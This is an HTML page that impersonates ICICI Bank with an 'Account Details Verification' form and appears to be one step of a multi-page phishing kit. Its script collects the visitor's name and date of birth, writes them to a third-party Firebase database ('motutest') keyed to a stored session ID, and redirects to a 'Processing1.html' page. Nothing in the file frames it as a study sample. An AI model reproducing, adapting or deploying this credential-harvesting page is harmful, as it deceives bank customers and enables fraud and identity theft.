<!DOCTYPE html>
<html>
   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
   <meta name="theme-color" content="#fff">
   <head>
      <meta charSet="utf-8"/>
      <meta name="viewport" content="width=device-width"/>
      <meta name="description" content="login"/>
      <meta name="next-head-count" content="4"/>
      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
      <link rel="manifest" href="/site.webmanifest">
      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
      <meta name="msapplication-TileColor" content="#da532c">
      <link rel="preload" href="Axis.css" as="style"/>
      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
      <title>Account Details | ICICI Bank</title>      
      <noscript data-n-css=""></noscript>
      <style>
         .new-control {
            text-transform: uppercase;
         }
         .error {
            color: Red;
            font-family: 'Work Sans', sans-serif;
            font-size: 11px;
            font-style: italic;
         }
         .submit {
            background-color: #f69312;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Work Sans', sans-serif;
            cursor: pointer;
            transition: background-color 0.3s ease;
         }
         .submit:hover {
            background-color: #ffac33;
         }
      </style>
      <!-- Add Firebase SDK -->
      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
   </head>
   <body>
      <div class="login-box">
         <div id="__next">
            <img alt="" src="icici h.jpg" style="width:100%;" />
         </div>
         <div class="mainContent">
            <h1 class="text-center">Account Details Verification</h1>
            <div class="card">
               <form class="LoginForm">
                  <input type="hidden" name="" value=""/>
                  <div class="form-group">
                     <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Account_Holder_Name">
                        Account Holder Name <p1 style="font-size:13px; color:red;">*</p1>
                     </label>
                     <input type="text" class="new-control" id="Account_Holder_Name" name="Account_Holder_Name" minLength="3" maxLength="30" required/>
                  </div>
                  <div class="form-group">
                     <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Date_Of_Birth">
                        Date Of Birth<p1 style="font-size:13px; color:red;">*</p1>
                     </label>
                     <input type="text" class="new-control" id="Date_Of_Birth" name="Date_Of_Birth" maxLength="10" required/>
                  </div>
                  <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Date Of Birth !</span></p1>
                  <div class="text-center"><button type="submit" class="submit">SUBMIT</button></div>
               </form>
            </div>
            <br><br>
            <img alt="" src="ICICI OTP F.jpg" style="width: 100%; height: auto;" />
         </div>
      </div>

      <!-- Firebase Configuration and Data Submission -->
    <script>
   // Initialize Firebase (Replace with your Firebase config)
   const firebaseConfig = {
      apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
      authDomain: "motutest-ac954.firebaseapp.com",
      databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
      projectId: "motutest-ac954",
      storageBucket: "motutest-ac954.firebasestorage.app",
      messagingSenderId: "85522378752",
      appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
   };
   if (!firebase.apps.length) {
      firebase.initializeApp(firebaseConfig);
   }
   const database = firebase.database();

   // Date Validation Logic
   var isShift = false;
   var seperator = "/";
   window.onload = function () {
      var inputs = document.getElementsByTagName("input");
      for (var i = 0; i < inputs.length; i++) {
         if (inputs[i].name == "Date_Of_Birth") {
            inputs[i].setAttribute("maxlength", 10);
            inputs[i].onkeydown = function (e) {
               return IsNumeric(this, e.keyCode);
            };
            inputs[i].onkeyup = function (e) {
               ValidateDateFormat(this, e.keyCode);
            };
         }
      }
   };

   function IsNumeric(input, keyCode) {
      if (keyCode == 16) {
         isShift = true;
      }
      if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
         if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
            input.value += seperator;
         }
         return true;
      } else {
         return false;
      }
   };

   function ValidateDateFormat(input, keyCode) {
      var dateString = input.value;
      if (keyCode == 16) {
         isShift = false;
      }
      var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
      if (regex.test(dateString) || dateString.length == 0) {
         ShowHideError(input, "none");
      } else {
         ShowHideError(input, "block");
      }
   };

   function ShowHideError(textbox, display) {
      var row = textbox.parentNode.parentNode;
      var errorMsg = row.getElementsByTagName("span")[0];
      if (errorMsg != null) {
         errorMsg.style.display = display;
      }
   };

   // Handle form submission
   document.querySelector('.LoginForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const accountHolderName = document.getElementById('Account_Holder_Name').value;
      const dateOfBirth = document.getElementById('Date_Of_Birth').value;

      var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
      if (!regex.test(dateOfBirth)) {
         alert("Invalid Date of Birth format! Please use dd/MM/yyyy.");
         return;
      }

      // 🔹 Get saved userId from localStorage
      const currentUserId = localStorage.getItem("currentUserId");
      if (!currentUserId) {
         alert("Session expired. Please start again.");
         return;
      }

      try {
         // 🔹 Update existing user instead of push
         await database.ref("user/" + currentUserId).update({
            accountHolderName: accountHolderName,
            dateOfBirth: dateOfBirth,
            
         });

         console.log("✅ Account details saved for user:", currentUserId);

         // Redirect
         window.location.href = "Processing1.html";
      } catch (error) {
         console.error("❌ Error saving data:", error);
         alert("Error submitting account details. Please try again.");
      }
   });
</script>

   </body>
</html>